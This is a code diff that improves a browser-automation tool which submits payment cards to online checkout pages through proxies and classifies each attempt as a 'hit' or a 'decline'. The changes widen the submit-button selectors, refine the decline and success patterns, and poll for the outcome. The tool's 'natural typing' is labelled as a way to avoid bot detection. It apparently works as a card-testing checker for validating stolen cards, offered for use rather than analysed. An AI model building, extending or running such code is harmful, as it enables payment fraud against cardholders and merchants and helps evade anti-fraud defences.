@@ -73,6 +73,9 @@ const SUBMIT_SELECTORS = [
   'button[type="submit"]',
   'input[type="submit"]',
   'button:has-text("Pay now")',
+  'button:has-text("Start trial")',
+  'button:has-text("Subscribe")',
+  'button:has-text("Start")',
   'button:has-text("Pay")',
   'button:has-text("Place Order")',
   'button:has-text("Complete Order")',
@@ -84,7 +87,8 @@ const SUBMIT_SELECTORS = [
 ];
 
 const SUCCESS_RE = /(\/success|\/confirmation|\/thank[-_]?you|\/complete|\/confirmed|\/receipt|\/order[-_]?complete|payment[-_]?success|order[-_]?confirmed)/i;
-const DECLINE_RE = /\b(declin|card.{0,20}declin|payment.{0,20}fail|insufficient.{0,20}fund|invalid.{0,20}card|not.{0,20}authoriz|try.{0,20}another|card.{0,20}error)\b/i;
+const DECLINE_RE = /(declin|insufficient.{0,25}fund|did not author|not.{0,20}authori|card.{0,30}(reject|refus|declin)|expired card|incorrect (cvc|cvv|security)|generic_decline|do_not_honor|invalid card)/i;
+const FORM_ERROR_RE = /(enter your (card|name|zip|postal)|card number.{0,25}(incomplete|invalid|required)|expiration.{0,25}(incomplete|invalid|required)|(cvc|cvv|security code).{0,25}(incomplete|invalid|required)|name.{0,20}required|zip.{0,20}required)/i;
 
 // ── Natural typing (avoids bot detection) ─────────────────────────────────────
 async function typeNatural(page, value, delayMs = 45) {
@@ -287,15 +291,23 @@ async function detectResult(page) {
   const url = page.url();
   if (SUCCESS_RE.test(url)) return { status: 'hit', message: 'Success page URL detected' };
 
-  // Check visible page text
   try {
-    const bodyText = await page.evaluate(() => document.body?.innerText || '');
-    if (DECLINE_RE.test(bodyText))    return { status: 'decline', message: bodyText.match(DECLINE_RE)?.[0] || 'Declined' };
-    if (SUCCESS_RE.test(bodyText))    return { status: 'hit',     message: 'Success text detected on page' };
+    const bodyText = (await page.evaluate(() => document.body?.innerText || '')) || '';
 
-    // Stripe-specific: look for "Your payment was declined" or "succeeded"
-    if (/payment.{0,30}succeed/i.test(bodyText)) return { status: 'hit',     message: 'Payment succeeded' };
-    if (/card.{0,30}declin/i.test(bodyText))     return { status: 'decline', message: 'Card was declined' };
+    // Success
+    if (/payment.{0,30}succeed/i.test(bodyText) || /order.{0,10}confirm/i.test(bodyText) || SUCCESS_RE.test(bodyText)) {
+      return { status: 'hit', message: 'Success text detected' };
+    }
+    // Decline (card rejected / insufficient funds / not authorized)
+    if (DECLINE_RE.test(bodyText)) {
+      const m = bodyText.match(DECLINE_RE);
+      return { status: 'decline', message: m ? m[0] : 'Card declined' };
+    }
+    // Form validation error (some field still empty/invalid)
+    if (FORM_ERROR_RE.test(bodyText)) {
+      const m = bodyText.match(FORM_ERROR_RE);
+      return { status: 'error', message: `Form error: ${m ? m[0] : 'fields incomplete'}` };
+    }
   } catch {}
 
   return { status: 'unknown', message: 'Could not determine result' };
@@ -380,20 +392,27 @@ export async function processCheckout({ url, card, proxy }) {
     // Screenshot BEFORE submit
     const screenshotBefore = await page.screenshot({ type: 'jpeg', quality: 85, fullPage: false });
 
-    // Click submit
+    // Log whether the submit button is enabled (diagnostic)
+    try {
+      const btnState = await page.evaluate(() => {
+        const btn = document.querySelector('[data-testid="hosted-payment-submit-button"]') || document.querySelector('button[type="submit"]') || document.querySelector('button');
+        if (!btn) return 'not-found';
+        return (btn.disabled || btn.getAttribute('aria-disabled') === 'true') ? 'disabled' : 'enabled';
+      });
+      console.log('[Autofill] submit button state:', btnState);
+    } catch {}
+
+    // Click submit (page.click waits for the button to be enabled & actionable)
     let submitted = false;
     for (const sel of SUBMIT_SELECTORS) {
       try {
-        const btn = await page.$(sel);
-        if (btn && await btn.isVisible()) {
-          await btn.scrollIntoViewIfNeeded();
-          await page.waitForTimeout(300);
-          await btn.click();
-          submitted = true;
-          console.log(`[Autofill] Clicked submit: ${sel}`);
-          break;
-        }
-      } catch {}
+        await page.click(sel, { timeout: 8000 });
+        submitted = true;
+        console.log(`[Autofill] Clicked submit: ${sel}`);
+        break;
+      } catch (e) {
+        console.warn(`[Autofill] submit selector failed: ${sel} — ${(e.message || '').slice(0, 60)}`);
+      }
     }
 
     if (!submitted) {
@@ -406,15 +425,19 @@ export async function processCheckout({ url, card, proxy }) {
       };
     }
 
-    // Wait for page to settle after submit (up to 15 s)
-    try {
-      await page.waitForNavigation({ timeout: 8000, waitUntil: 'domcontentloaded' });
-    } catch {}
-    await page.waitForTimeout(3000);
+    // Poll for the payment outcome (success / decline / validation error)
+    let result = null;
+    const t0 = Date.now();
+    while (Date.now() - t0 < 25000) {
+      try { await page.waitForNavigation({ timeout: 2500, waitUntil: 'domcontentloaded' }); } catch {}
+      result = await detectResult(page);
+      if (result.status !== 'unknown') break;
+      await page.waitForTimeout(1200);
+    }
+    if (!result) result = await detectResult(page);
 
     // Screenshot AFTER submit
     const screenshotAfter = await page.screenshot({ type: 'jpeg', quality: 85, fullPage: false });
-    const result          = await detectResult(page);
 
     console.log(`[Autofill] Result: ${result.status} — ${result.message}`);
 
